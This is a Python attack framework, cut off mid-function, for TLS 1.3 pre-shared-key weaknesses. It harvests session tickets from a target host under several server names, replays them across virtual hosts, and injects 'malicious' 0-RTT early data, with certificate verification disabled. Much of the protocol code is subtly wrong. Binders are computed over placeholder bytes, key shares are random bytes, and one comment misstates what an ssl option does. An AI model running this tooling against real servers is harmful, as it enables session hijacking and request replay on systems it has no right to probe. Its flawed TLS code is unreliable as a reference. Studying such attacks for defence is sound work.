#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced TLS 1.3 PSK Cross-Host Binding Attack Framework
========================================================

A comprehensive security assessment tool for TLS 1.3 Pre-Shared Key (PSK) vulnerabilities,
specifically targeting cross-SNI session binding flaws and 0-RTT replay attacks.

Key Features:
- Complete TLS 1.3 handshake implementation
- PSK ticket harvesting across multiple SNIs  
- 0-RTT early data injection testing
- Session ticket replay and cross-binding attacks
- PSK lifetime and binding scope analysis
- Advanced cryptographic attack vectors
- Comprehensive vulnerability reporting

Attack Vectors:
- Cross-SNI PSK session hijacking
- 0-RTT replay attacks across virtual hosts
- PSK lifetime abuse and extended replay windows
- Session ticket fingerprinting
- PSK binding scope confusion
- Early data injection across security boundaries
"""

import asyncio
import socket
import ssl
import time
import struct
import secrets
import hashlib
import hmac
import json
import logging
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from enum import IntEnum, Enum
from concurrent.futures import ThreadPoolExecutor
import binascii
import base64
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class TLSContentType(IntEnum):
    """TLS Content Types"""
    INVALID = 0
    CHANGE_CIPHER_SPEC = 20
    ALERT = 21
    HANDSHAKE = 22
    APPLICATION_DATA = 23

class TLSHandshakeType(IntEnum):
    """TLS Handshake Message Types"""
    HELLO_REQUEST = 0
    CLIENT_HELLO = 1
    SERVER_HELLO = 2
    HELLO_VERIFY_REQUEST = 3
    NEW_SESSION_TICKET = 4
    END_OF_EARLY_DATA = 5
    HELLO_RETRY_REQUEST = 6
    ENCRYPTED_EXTENSIONS = 8
    CERTIFICATE = 11
    SERVER_KEY_EXCHANGE = 12
    CERTIFICATE_REQUEST = 13
    SERVER_HELLO_DONE = 14
    CERTIFICATE_VERIFY = 15
    CLIENT_KEY_EXCHANGE = 16
    FINISHED = 20
    CERTIFICATE_URL = 21
    CERTIFICATE_STATUS = 22
    SUPPLEMENTAL_DATA = 23
    KEY_UPDATE = 24
    MESSAGE_HASH = 254

class TLSExtensionType(IntEnum):
    """TLS Extension Types"""
    SERVER_NAME = 0
    MAX_FRAGMENT_LENGTH = 1
    CLIENT_CERTIFICATE_URL = 2
    TRUSTED_CA_KEYS = 3
    TRUNCATED_HMAC = 4
    STATUS_REQUEST = 5
    USER_MAPPING = 6
    CLIENT_AUTHZ = 7
    SERVER_AUTHZ = 8
    CERT_TYPE = 9
    SUPPORTED_GROUPS = 10
    EC_POINT_FORMATS = 11
    SRP = 12
    SIGNATURE_ALGORITHMS = 13
    USE_SRTP = 14
    HEARTBEAT = 15
    APPLICATION_LAYER_PROTOCOL_NEGOTIATION = 16
    STATUS_REQUEST_V2 = 17
    SIGNED_CERTIFICATE_TIMESTAMP = 18
    CLIENT_CERTIFICATE_TYPE = 19
    SERVER_CERTIFICATE_TYPE = 20
    PADDING = 21
    ENCRYPT_THEN_MAC = 22
    EXTENDED_MASTER_SECRET = 23
    TOKEN_BINDING = 24
    CACHED_INFO = 25
    TLS_LTS = 26
    COMPRESS_CERTIFICATE = 27
    RECORD_SIZE_LIMIT = 28
    PWD_PROTECT = 29
    PWD_CLEAR = 30
    PASSWORD_SALT = 31
    TICKET_PINNING = 32
    TLS_CERT_WITH_EXTERN_PSK = 33
    DELEGATED_CREDENTIAL = 34
    SESSION_TICKET = 35
    PRE_SHARED_KEY = 41
    EARLY_DATA = 42
    SUPPORTED_VERSIONS = 43
    COOKIE = 44
    PSK_KEY_EXCHANGE_MODES = 45
    CERTIFICATE_AUTHORITIES = 47
    OID_FILTERS = 48
    POST_HANDSHAKE_AUTH = 49
    SIGNATURE_ALGORITHMS_CERT = 50
    KEY_SHARE = 51
    TRANSPARENCY_INFO = 52
    CONNECTION_ID_DEPRECATED = 53
    CONNECTION_ID = 54
    EXTERNAL_ID_HASH = 55
    EXTERNAL_SESSION_ID = 56
    QUIC_TRANSPORT_PARAMETERS = 57
    TICKET_REQUEST = 58
    DNSSEC_CHAIN = 59

class TLSVersion(IntEnum):
    """TLS Protocol Versions"""
    TLS_1_0 = 0x0301
    TLS_1_1 = 0x0302
    TLS_1_2 = 0x0303
    TLS_1_3 = 0x0304

class TLSCipherSuite(IntEnum):
    """TLS 1.3 Cipher Suites"""
    TLS_AES_128_GCM_SHA256 = 0x1301
    TLS_AES_256_GCM_SHA384 = 0x1302
    TLS_CHACHA20_POLY1305_SHA256 = 0x1303
    TLS_AES_128_CCM_SHA256 = 0x1304
    TLS_AES_128_CCM_8_SHA256 = 0x1305

class PSKKeyExchangeMode(IntEnum):
    """PSK Key Exchange Modes"""
    PSK_KE = 0
    PSK_DHE_KE = 1

class NamedGroup(IntEnum):
    """Named Groups for Key Exchange"""
    SECP256R1 = 0x0017
    SECP384R1 = 0x0018
    SECP521R1 = 0x0019
    X25519 = 0x001D
    X448 = 0x001E

@dataclass
class TLSRecord:
    """TLS Record Structure"""
    content_type: TLSContentType
    version: TLSVersion
    length: int
    fragment: bytes
    
    def __bytes__(self) -> bytes:
        """Convert to wire format"""
        return struct.pack('>BHH', self.content_type, self.version, self.length) + self.fragment

@dataclass
class PSKIdentity:
    """PSK Identity Structure"""
    identity: bytes
    obfuscated_ticket_age: int
    
    def __bytes__(self) -> bytes:
        """Convert to wire format"""
        return struct.pack('>H', len(self.identity)) + self.identity + struct.pack('>I', self.obfuscated_ticket_age)

@dataclass
class PSKBinder:
    """PSK Binder Structure"""
    binder: bytes
    
    def __bytes__(self) -> bytes:
        """Convert to wire format"""
        return struct.pack('>B', len(self.binder)) + self.binder

@dataclass
class SessionTicket:
    """TLS 1.3 Session Ticket"""
    ticket: bytes
    ticket_lifetime: int
    ticket_age_add: int
    ticket_nonce: bytes
    max_early_data: Optional[int]
    extensions: Dict[int, bytes]
    timestamp: float
    server_name: str
    cipher_suite: int
    master_secret: Optional[bytes] = None
    
    def calculate_obfuscated_age(self) -> int:
        """Calculate obfuscated ticket age"""
        age_ms = int((time.time() - self.timestamp) * 1000)
        return (age_ms + self.ticket_age_add) % (2**32)
    
    def is_expired(self) -> bool:
        """Check if ticket has expired"""
        age_seconds = time.time() - self.timestamp
        return age_seconds > self.ticket_lifetime

@dataclass
class AttackResult:
    """Attack Result Structure"""
    attack_type: str
    target_sni: str
    source_sni: Optional[str] = None
    success: bool = False
    vulnerability_detected: bool = False
    evidence: List[str] = None
    response_status: Optional[int] = None
    response_headers: Dict[str, str] = None
    handshake_time_ms: float = 0.0
    early_data_accepted: bool = False
    error: Optional[str] = None
    
    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []
        if self.response_headers is None:
            self.response_headers = {}

class HKDF:
    """HKDF Implementation for TLS 1.3"""
    
    @staticmethod
    def extract(salt: bytes, ikm: bytes, hash_func=hashlib.sha256) -> bytes:
        """HKDF Extract step"""
        if len(salt) == 0:
            salt = b'\x00' * hash_func().digest_size
        return hmac.new(salt, ikm, hash_func).digest()
    
    @staticmethod
    def expand(prk: bytes, info: bytes, length: int, hash_func=hashlib.sha256) -> bytes:
        """HKDF Expand step"""
        hash_len = hash_func().digest_size
        n = (length + hash_len - 1) // hash_len
        
        t = b''
        okm = b''
        
        for i in range(1, n + 1):
            t = hmac.new(prk, t + info + struct.pack('>B', i), hash_func).digest()
            okm += t
        
        return okm[:length]
    
    @staticmethod
    def expand_label(secret: bytes, label: str, context: bytes, length: int, 
                     hash_func=hashlib.sha256) -> bytes:
        """TLS 1.3 HKDF-Expand-Label"""
        hkdf_label = struct.pack('>H', length)
        label_bytes = f"tls13 {label}".encode('utf-8')
        hkdf_label += struct.pack('>B', len(label_bytes)) + label_bytes
        hkdf_label += struct.pack('>B', len(context)) + context
        
        return HKDF.expand(secret, hkdf_label, length, hash_func)

class TLS13MessageBuilder:
    """TLS 1.3 Message Construction"""
    
    @staticmethod
    def build_client_hello(server_name: str, psk_identities: List[PSKIdentity] = None,
                          psk_binders: List[PSKBinder] = None, 
                          early_data: bool = False) -> bytes:
        """Build TLS 1.3 ClientHello with PSK support"""
        
        # Random (32 bytes)
        random = secrets.token_bytes(32)
        
        # Session ID (legacy)
        session_id = secrets.token_bytes(32)
        
        # Cipher suites
        cipher_suites = struct.pack('>HHH', 6,  # Length
                                   TLSCipherSuite.TLS_AES_128_GCM_SHA256,
                                   TLSCipherSuite.TLS_AES_256_GCM_SHA384,
                                   TLSCipherSuite.TLS_CHACHA20_POLY1305_SHA256)
        
        # Compression methods
        compression_methods = struct.pack('>BB', 1, 0)  # Only NULL compression
        
        # Extensions
        extensions = b''
        
        # Server Name Indication
        if server_name:
            sni_data = TLS13MessageBuilder._build_sni_extension(server_name)
            extensions += struct.pack('>HH', TLSExtensionType.SERVER_NAME, len(sni_data)) + sni_data
        
        # Supported Versions
        supported_versions = struct.pack('>BH', 2, TLSVersion.TLS_1_3)
        extensions += struct.pack('>HH', TLSExtensionType.SUPPORTED_VERSIONS, 
                                 len(supported_versions)) + supported_versions
        
        # Key Share
        key_share_data = TLS13MessageBuilder._build_key_share_extension()
        extensions += struct.pack('>HH', TLSExtensionType.KEY_SHARE, 
                                 len(key_share_data)) + key_share_data
        
        # PSK Key Exchange Modes
        if psk_identities:
            psk_modes = struct.pack('>BB', 1, PSKKeyExchangeMode.PSK_DHE_KE)
            extensions += struct.pack('>HH', TLSExtensionType.PSK_KEY_EXCHANGE_MODES,
                                     len(psk_modes)) + psk_modes
        
        # Early Data indication
        if early_data:
            extensions += struct.pack('>HH', TLSExtensionType.EARLY_DATA, 0)
        
        # Pre-Shared Key (must be last extension)
        if psk_identities and psk_binders:
            psk_data = TLS13MessageBuilder._build_psk_extension(psk_identities, psk_binders)
            extensions += struct.pack('>HH', TLSExtensionType.PRE_SHARED_KEY,
                                     len(psk_data)) + psk_data
        
        # Construct ClientHello
        client_hello = struct.pack('>H', TLSVersion.TLS_1_2)  # Legacy version
        client_hello += random
        client_hello += struct.pack('>B', len(session_id)) + session_id
        client_hello += cipher_suites
        client_hello += compression_methods
        client_hello += struct.pack('>H', len(extensions)) + extensions
        
        # Wrap in handshake message
        handshake_msg = struct.pack('>BI', TLSHandshakeType.CLIENT_HELLO, 
                                   len(client_hello)) + client_hello
        
        return handshake_msg
    
    @staticmethod
    def _build_sni_extension(server_name: str) -> bytes:
        """Build Server Name Indication extension"""
        sni_bytes = server_name.encode('utf-8')
        sni_list = struct.pack('>BH', 0, len(sni_bytes)) + sni_bytes  # Type 0 = hostname
        return struct.pack('>H', len(sni_list)) + sni_list
    
    @staticmethod
    def _build_key_share_extension() -> bytes:
        """Build Key Share extension with X25519"""
        # Generate X25519 key pair (simplified)
        public_key = secrets.token_bytes(32)  # X25519 public key
        key_share_entry = struct.pack('>HH', NamedGroup.X25519, 32) + public_key
        key_share_list = struct.pack('>H', len(key_share_entry)) + key_share_entry
        return key_share_list
    
    @staticmethod
    def _build_psk_extension(identities: List[PSKIdentity], binders: List[PSKBinder]) -> bytes:
        """Build Pre-Shared Key extension"""
        # Identities
        identities_data = b''
        for identity in identities:
            identities_data += bytes(identity)
        
        identities_section = struct.pack('>H', len(identities_data)) + identities_data
        
        # Binders
        binders_data = b''
        for binder in binders:
            binders_data += bytes(binder)
        
        binders_section = struct.pack('>H', len(binders_data)) + binders_data
        
        return identities_section + binders_section
    
    @staticmethod
    def build_early_data_record(data: bytes) -> bytes:
        """Build early data application record"""
        record = TLSRecord(
            content_type=TLSContentType.APPLICATION_DATA,
            version=TLSVersion.TLS_1_2,  # Legacy version for records
            length=len(data),
            fragment=data
        )
        return bytes(record)

class TLS13PSKCrossBind:
    """Advanced TLS 1.3 PSK Cross-Host Binding Attack Framework"""
    
    def __init__(self, target_host: str, target_port: int = 443, 
                 timeout: float = 10.0, max_retries: int = 3):
        """Initialize the attack framework"""
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.max_retries = max_retries
        self.psk_cache: Dict[str, List[SessionTicket]] = {}
        self.connection_pool = {}
        self.attack_stats = {
            'total_attempts': 0,
            'successful_binds': 0,
            'cross_sni_success': 0,
            'zero_rtt_success': 0,
            'replay_success': 0
        }
        
    async def run_comprehensive_assessment(self, sni_list: List[str]) -> Dict[str, Any]:
        """Run comprehensive PSK cross-binding assessment"""
        logger.info(f"Starting TLS 1.3 PSK cross-binding assessment against {self.target_host}:{self.target_port}")
        
        start_time = time.time()
        results = {
            'target': f"{self.target_host}:{self.target_port}",
            'timestamp': datetime.now().isoformat(),
            'sni_list': sni_list,
            'attacks': {},
            'vulnerabilities': [],
            'statistics': {},
            'metadata': {
                'tool_version': '3.0',
                'assessment_duration': 0,
                'total_tickets_collected': 0
            }
        }
        
        # Phase 1: Session Ticket Harvesting
        logger.info("Phase 1: Harvesting PSK session tickets...")
        harvest_result = await self.harvest_psk_tickets(sni_list)
        results['attacks']['ticket_harvest'] = harvest_result
        results['metadata']['total_tickets_collected'] = harvest_result['total_tickets']
        
        if harvest_result['total_tickets'] == 0:
            logger.warning("No session tickets collected - aborting assessment")
            return results
        
        # Phase 2: Cross-SNI Binding Tests
        logger.info("Phase 2: Testing cross-SNI PSK binding...")
        binding_results = await self.test_cross_sni_binding_matrix(sni_list)
        results['attacks']['cross_sni_binding'] = binding_results
        
        # Phase 3: 0-RTT Early Data Tests
        logger.info("Phase 3: Testing 0-RTT early data attacks...")
        zero_rtt_results = await self.test_zero_rtt_attacks(sni_list)
        results['attacks']['zero_rtt_attacks'] = zero_rtt_results
        
        # Phase 4: PSK Replay Attacks
        logger.info("Phase 4: Testing PSK replay attacks...")
        replay_results = await self.test_psk_replay_attacks(sni_list)
        results['attacks']['replay_attacks'] = replay_results
        
        # Phase 5: Lifetime and Scope Analysis
        logger.info("Phase 5: Analyzing PSK lifetime and scope...")
        scope_results = await self.analyze_psk_scope_and_lifetime(sni_list)
        results['attacks']['scope_analysis'] = scope_results
        
        # Phase 6: Advanced Attack Vectors
        logger.info("Phase 6: Testing advanced PSK attack vectors...")
        advanced_results = await self.test_advanced_psk_attacks(sni_list)
        results['attacks']['advanced_attacks'] = advanced_results
        
        # Compile results and generate report
        results['metadata']['assessment_duration'] = time.time() - start_time
        results['statistics'] = self.compile_attack_statistics()
        self._analyze_vulnerabilities(results)
        
        return results
    
    async def harvest_psk_tickets(self, sni_list: List[str]) -> Dict[str, Any]:
        """Harvest PSK session tickets from multiple SNIs"""
        results = {
            'sni_results': {},
            'total_tickets': 0,
            'successful_snis': 0,
            'failed_snis': []
        }
        
        # Use concurrent harvesting for efficiency
        tasks = [self._harvest_tickets_from_sni(sni) for sni in sni_list]
        sni_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for sni, result in zip(sni_list, sni_results):
            if isinstance(result, Exception):
                logger.error(f"Failed to harvest from {sni}: {result}")
                results['failed_snis'].append(sni)
                results['sni_results'][sni] = {'error': str(result), 'tickets': 0}
            else:
                tickets = result.get('tickets', [])
                self.psk_cache[sni] = tickets
                results['sni_results'][sni] = {
                    'tickets': len(tickets),
                    'cipher_suites': list(set(t.cipher_suite for t in tickets)),
                    'max_lifetime': max((t.ticket_lifetime for t in tickets), default=0),
                    'early_data_capable': any(t.max_early_data for t in tickets)
                }
                results['total_tickets'] += len(tickets)
                if tickets:
                    results['successful_snis'] += 1
        
        logger.info(f"Ticket harvest complete: {results['total_tickets']} tickets from {results['successful_snis']} SNIs")
        return results
    
    async def _harvest_tickets_from_sni(self, sni: str) -> Dict[str, Any]:
        """Harvest session tickets from specific SNI with enhanced collection"""
        tickets = []
        
        for attempt in range(self.max_retries):
            try:
                # Create enhanced TLS context
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.minimum_version = ssl.TLSVersion.TLSv1_3
                context.maximum_version = ssl.TLSVersion.TLSv1_3
                
                # Enable session tickets
                context.options |= ssl.OP_NO_TICKET  # Paradoxically enables tickets in some contexts
                
                sock = socket.create_connection((self.target_host, self.target_port), self.timeout)
                
                with context.wrap_socket(sock, server_hostname=sni) as ssock:
                    # Trigger session ticket issuance
                    request = f"GET / HTTP/1.1\r\nHost: {sni}\r\nConnection: close\r\n\r\n"
                    ssock.send(request.encode())
                    response = ssock.recv(4096)
                    
                    # Extract session information
                    session = ssock.session
                    if session and hasattr(session, 'ticket') and session.ticket:
                        ticket = SessionTicket(
                            ticket=session.ticket,
                            ticket_lifetime=getattr(session, 'ticket_lifetime', 7200),
                            ticket_age_add=getattr(session, 'ticket_age_add', 0),
                            ticket_nonce=getattr(session, 'ticket_nonce', b''),
                            max_early_data=getattr(session, 'max_early_data_size', None),
                            extensions={},
                            timestamp=time.time(),
                            server_name=sni,
                            cipher_suite=TLSCipherSuite.TLS_AES_128_GCM_SHA256,  # Default
                            master_secret=getattr(session, 'master_secret', None)
                        )
                        tickets.append(ticket)
                        
                        # Try to get additional tickets through multiple requests
                        for i in range(2):
                            try:
                                keep_alive_request = f"GET /favicon.ico HTTP/1.1\r\nHost: {sni}\r\n\r\n"
                                ssock.send(keep_alive_request.encode())
                                additional_response = ssock.recv(2048)
                                
                                # Check for new session ticket
                                new_session = ssock.session
                                if (new_session and new_session.ticket and 
                                    new_session.ticket != session.ticket):
                                    additional_ticket = SessionTicket(
                                        ticket=new_session.ticket,
                                        ticket_lifetime=getattr(new_session, 'ticket_lifetime', 7200),
                                        ticket_age_add=getattr(new_session, 'ticket_age_add', 0),
                                        ticket_nonce=getattr(new_session, 'ticket_nonce', b''),
                                        max_early_data=getattr(new_session, 'max_early_data_size', None),
                                        extensions={},
                                        timestamp=time.time(),
                                        server_name=sni,
                                        cipher_suite=TLSCipherSuite.TLS_AES_128_GCM_SHA256,
                                        master_secret=getattr(new_session, 'master_secret', None)
                                    )
                                    tickets.append(additional_ticket)
                                    session = new_session
                            except:
                                break
                
                break  # Success, exit retry loop
                
            except Exception as e:
                if attempt == self.max_retries - 1:
                    logger.error(f"Failed to harvest tickets from {sni} after {self.max_retries} attempts: {e}")
                    raise
                await asyncio.sleep(0.5 * (2 ** attempt))  # Exponential backoff
        
        return {'tickets': tickets}
    
    async def test_cross_sni_binding_matrix(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test PSK cross-binding across all SNI combinations"""
        results = {
            'binding_matrix': {},
            'total_tests': 0,
            'successful_binds': 0,
            'vulnerabilities': []
        }
        
        # Test all combinations
        for source_sni in sni_list:
            if source_sni not in self.psk_cache or not self.psk_cache[source_sni]:
                continue
                
            results['binding_matrix'][source_sni] = {}
            
            for target_sni in sni_list:
                if source_sni == target_sni:
                    continue
                
                logger.info(f"Testing cross-binding: {source_sni} -> {target_sni}")
                
                binding_result = await self._test_cross_sni_binding(source_sni, target_sni)
                results['binding_matrix'][source_sni][target_sni] = binding_result
                results['total_tests'] += binding_result['tests_performed']
                results['successful_binds'] += binding_result['successful_binds']
                
                if binding_result['vulnerabilities']:
                    results['vulnerabilities'].extend(binding_result['vulnerabilities'])
        
        return results
    
    async def _test_cross_sni_binding(self, source_sni: str, target_sni: str) -> Dict[str, Any]:
        """Test PSK binding from source SNI to target SNI"""
        source_tickets = self.psk_cache.get(source_sni, [])
        if not source_tickets:
            return {'tests_performed': 0, 'successful_binds': 0, 'vulnerabilities': []}
        
        results = {
            'tests_performed': 0,
            'successful_binds': 0,
            'vulnerabilities': [],
            'test_details': []
        }
        
        for i, ticket in enumerate(source_tickets):
            if ticket.is_expired():
                continue
                
            logger.debug(f"Testing ticket {i+1}/{len(source_tickets)}")
            
            test_result = await self._perform_psk_binding_test(ticket, target_sni)
            results['test_details'].append(test_result)
            results['tests_performed'] += 1
            
            if test_result.success:
                results['successful_binds'] += 1
                
                # Create vulnerability report
                vulnerability = {
                    'type': 'PSK Cross-SNI Binding',
                    'severity': 'HIGH',
                    'source_sni': source_sni,
                    'target_sni': target_sni,
                    'evidence': f'PSK ticket from {source_sni} accepted by {target_sni}',
                    'impact': 'Session hijacking across virtual hosts',
                    'ticket_details': {
                        'lifetime': ticket.ticket_lifetime,
                        'age': time.time() - ticket.timestamp,
                        'cipher_suite': ticket.cipher_suite
                    }
                }
                results['vulnerabilities'].append(vulnerability)
                
                self.attack_stats['cross_sni_success'] += 1
            
            self.attack_stats['total_attempts'] += 1
        
        return results
    
    async def _perform_psk_binding_test(self, ticket: SessionTicket, target_sni: str) -> AttackResult:
        """Perform individual PSK binding test"""
        start_time = time.perf_counter()
        
        try:
            # Create PSK identity
            psk_identity = PSKIdentity(
                identity=ticket.ticket,
                obfuscated_ticket_age=ticket.calculate_obfuscated_age()
            )
            
            # Calculate PSK binder (simplified HMAC for proof of concept)
            binder_key = self._derive_binder_key(ticket)
            partial_client_hello = TLS13MessageBuilder.build_client_hello(
                target_sni, [psk_identity], []
            )
            binder_value = hmac.new(binder_key, partial_client_hello, hashlib.sha256).digest()
            psk_binder = PSKBinder(binder_value[:32])  # Truncate to 32 bytes
            
            # Build complete ClientHello with PSK
            client_hello = TLS13MessageBuilder.build_client_hello(
                target_sni, [psk_identity], [psk_binder]
            )
            
            # Create TLS record
            record = TLSRecord(
                content_type=TLSContentType.HANDSHAKE,
                version=TLSVersion.TLS_1_2,
                length=len(client_hello),
                fragment=client_hello
            )
            
            # Send handshake
            response = await self._send_tls_handshake(bytes(record), target_sni)
            
            handshake_time = (time.perf_counter() - start_time) * 1000
            
            # Analyze response
            success = self._analyze_psk_response(response)
            
            return AttackResult(
                attack_type='PSK Cross-Binding',
                target_sni=target_sni,
                source_sni=ticket.server_name,
                success=success,
                vulnerability_detected=success,
                handshake_time_ms=handshake_time,
                evidence=['PSK handshake completed successfully'] if success else []
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='PSK Cross-Binding',
                target_sni=target_sni,
                source_sni=ticket.server_name,
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def test_zero_rtt_attacks(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test 0-RTT early data attacks across SNIs"""
        results = {
            'zero_rtt_tests': {},
            'total_tests': 0,
            'successful_attacks': 0,
            'vulnerabilities': []
        }
        
        for source_sni in sni_list:
            source_tickets = self.psk_cache.get(source_sni, [])
            if not source_tickets:
                continue
                
            results['zero_rtt_tests'][source_sni] = {}
            
            for target_sni in sni_list:
                if source_sni == target_sni:
                    continue
                
                logger.info(f"Testing 0-RTT attack: {source_sni} -> {target_sni}")
                
                zero_rtt_result = await self._test_zero_rtt_cross_sni(source_sni, target_sni)
                results['zero_rtt_tests'][source_sni][target_sni] = zero_rtt_result
                results['total_tests'] += zero_rtt_result['tests_performed']
                results['successful_attacks'] += zero_rtt_result['successful_attacks']
                
                if zero_rtt_result['vulnerabilities']:
                    results['vulnerabilities'].extend(zero_rtt_result['vulnerabilities'])
        
        return results
    
    async def _test_zero_rtt_cross_sni(self, source_sni: str, target_sni: str) -> Dict[str, Any]:
        """Test 0-RTT early data injection across SNIs"""
        source_tickets = self.psk_cache.get(source_sni, [])
        results = {
            'tests_performed': 0,
            'successful_attacks': 0,
            'vulnerabilities': []
        }
        
        # Test early data capable tickets
        for ticket in source_tickets:
            if not ticket.max_early_data or ticket.is_expired():
                continue
            
            logger.debug(f"Testing 0-RTT with ticket from {source_sni}")
            
            attack_result = await self._perform_zero_rtt_attack(ticket, target_sni)
            results['tests_performed'] += 1
            
            if attack_result.early_data_accepted:
                results['successful_attacks'] += 1
                
                vulnerability = {
                    'type': '0-RTT Cross-SNI Attack',
                    'severity': 'CRITICAL',
                    'source_sni': source_sni,
                    'target_sni': target_sni,
                    'evidence': 'Early data accepted across SNI boundary',
                    'impact': 'Request smuggling, replay attacks across virtual hosts',
                    'early_data_size': ticket.max_early_data
                }
                results['vulnerabilities'].append(vulnerability)
                
                self.attack_stats['zero_rtt_success'] += 1
        
        return results
    
    async def _perform_zero_rtt_attack(self, ticket: SessionTicket, target_sni: str) -> AttackResult:
        """Perform 0-RTT early data attack"""
        try:
            # Create PSK identity and binder
            psk_identity = PSKIdentity(
                identity=ticket.ticket,
                obfuscated_ticket_age=ticket.calculate_obfuscated_age()
            )
            
            binder_key = self._derive_binder_key(ticket)
            binder_value = hmac.new(binder_key, b"client_hello_partial", hashlib.sha256).digest()
            psk_binder = PSKBinder(binder_value[:32])
            
            # Build ClientHello with early data indication
            client_hello = TLS13MessageBuilder.build_client_hello(
                target_sni, [psk_identity], [psk_binder], early_data=True
            )
            
            # Prepare malicious early data
            early_data_payload = self._create_malicious_early_data(target_sni)
            early_data_record = TLS13MessageBuilder.build_early_data_record(early_data_payload)
            
            # Send 0-RTT attack
            handshake_record = TLSRecord(
                content_type=TLSContentType.HANDSHAKE,
                version=TLSVersion.TLS_1_2,
                length=len(client_hello),
                fragment=client_hello
            )
            
            full_attack = bytes(handshake_record) + early_data_record
            response = await self._send_tls_handshake(full_attack, target_sni)
            
            # Analyze for early data acceptance
            early_data_accepted = self._check_early_data_acceptance(response)
            
            return AttackResult(
                attack_type='0-RTT Attack',
                target_sni=target_sni,
                source_sni=ticket.server_name,
                success=True,
                vulnerability_detected=early_data_accepted,
                early_data_accepted=early_data_accepted,
                evidence=['Early data accepted by server'] if early_data_accepted else []
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='0-RTT Attack',
                target_sni=target_sni,
                source_sni=ticket.server_name,
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def test_psk_replay_attacks(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test PSK replay attacks and anti-replay mechanism bypass"""
        results = {
            'replay_tests': {},
            'total_replays': 0,
            'successful_replays': 0,
            'vulnerabilities': []
        }
        
        for sni in sni_list:
            tickets = self.psk_cache.get(sni, [])
            if not tickets:
                continue
            
            logger.info(f"Testing replay attacks for {sni}")
            
            replay_result = await self._test_replay_attacks_for_sni(sni)
            results['replay_tests'][sni] = replay_result
            results['total_replays'] += replay_result['total_replays']
            results['successful_replays'] += replay_result['successful_replays']
            
            if replay_result['vulnerabilities']:
                results['vulnerabilities'].extend(replay_result['vulnerabilities'])
        
        return results
    
    async def _test_replay_attacks_for_sni(self, sni: str) -> Dict[str, Any]:
        """Test replay attacks for specific SNI"""
        tickets = self.psk_cache.get(sni, [])
        results = {
            'total_replays': 0,
            'successful_replays': 0,
            'vulnerabilities': []
        }
        
        for ticket in tickets[:3]:  # Limit replay tests
            # Test immediate replay
            replay1 = await self._perform_replay_attack(ticket, sni, 0)
            replay2 = await self._perform_replay_attack(ticket, sni, 0)
            
            results['total_replays'] += 2
            
            if replay1.success and replay2.success:
                results['successful_replays'] += 2
                
                vulnerability = {
                    'type': 'PSK Replay Attack',
                    'severity': 'HIGH',
                    'sni': sni,
                    'evidence': 'PSK ticket allowed multiple immediate replays',
                    'impact': 'Session replay, potential data duplication'
                }
                results['vulnerabilities'].append(vulnerability)
                
                self.attack_stats['replay_success'] += 1
        
        return results
    
    async def _perform_replay_attack(self, ticket: SessionTicket, sni: str, delay: int) -> AttackResult:
        """Perform individual replay attack"""
        if delay > 0:
            await asyncio.sleep(delay)
            
        try:
            # Use exact same PSK parameters to test replay protection
            psk_identity = PSKIdentity(
                identity=ticket.ticket,
                obfuscated_ticket_age=ticket.calculate_obfuscated_age()
            )
            
            binder_key = self._derive_binder_key(ticket)
            binder_value = hmac.new(binder_key, b"replay_test", hashlib.sha256).digest()
            psk_binder = PSKBinder(binder_value[:32])
            
            client_hello = TLS13MessageBuilder.build_client_hello(sni, [psk_identity], [psk_binder])
            
            record = TLSRecord(
                content_type=TLSContentType.HANDSHAKE,
                version=TLSVersion.TLS_1_2,
                length=len(client_hello),
                fragment=client_hello
            )
            
            response = await self._send_tls_handshake(bytes(record), sni)
            success = self._analyze_psk_response(response)
            
            return AttackResult(
                attack_type='PSK Replay',
                target_sni=sni,
                success=success,
                vulnerability_detected=success
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='PSK Replay',
                target_sni=sni,
                success=False,
                error=str(e)
            )
    
    async def analyze_psk_scope_and_lifetime(self, sni_list: List[str]) -> Dict[str, Any]:
        """Analyze PSK binding scope and lifetime patterns"""
        results = {
            'scope_analysis': {},
            'lifetime_analysis': {},
            'vulnerabilities': []
        }
        
        # Analyze scope patterns
        for sni in sni_list:
            tickets = self.psk_cache.get(sni, [])
            if not tickets:
                continue
            
            scope_data = {
                'ticket_count': len(tickets),
                'avg_lifetime': sum(t.ticket_lifetime for t in tickets) / len(tickets),
                'max_lifetime': max(t.ticket_lifetime for t in tickets),
                'early_data_capable': sum(1 for t in tickets if t.max_early_data),
                'cipher_suites': list(set(t.cipher_suite for t in tickets))
            }
            
            results['scope_analysis'][sni] = scope_data
            
            # Check for excessive lifetimes
            if scope_data['max_lifetime'] > 86400:  # > 24 hours
                results['vulnerabilities'].append({
                    'type': 'Excessive PSK Lifetime',
                    'severity': 'MEDIUM',
                    'sni': sni,
                    'evidence': f'PSK tickets valid for {scope_data["max_lifetime"]} seconds',
                    'impact': 'Extended replay attack window'
                })
        
        return results
    
    async def test_advanced_psk_attacks(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test advanced PSK-based attack vectors"""
        results = {
            'fingerprinting': await self._test_psk_fingerprinting(sni_list),
            'timing_attacks': await self._test_psk_timing_attacks(sni_list),
            'downgrade_attacks': await self._test_psk_downgrade_attacks(sni_list),
            'vulnerabilities': []
        }
        
        # Collect vulnerabilities from all advanced tests
        for test_name, test_results in results.items():
            if isinstance(test_results, dict) and 'vulnerabilities' in test_results:
                results['vulnerabilities'].extend(test_results['vulnerabilities'])
        
        return results
    
    async def _test_psk_fingerprinting(self, sni_list: List[str]) -> Dict[str, Any]:
        """Test PSK-based server fingerprinting"""
        results = {'fingerprints': {}, 'vulnerabilities': []}
        
        for sni in sni_list:
            tickets = self.psk_cache.get(sni, [])
            if tickets:
                fingerprint = {
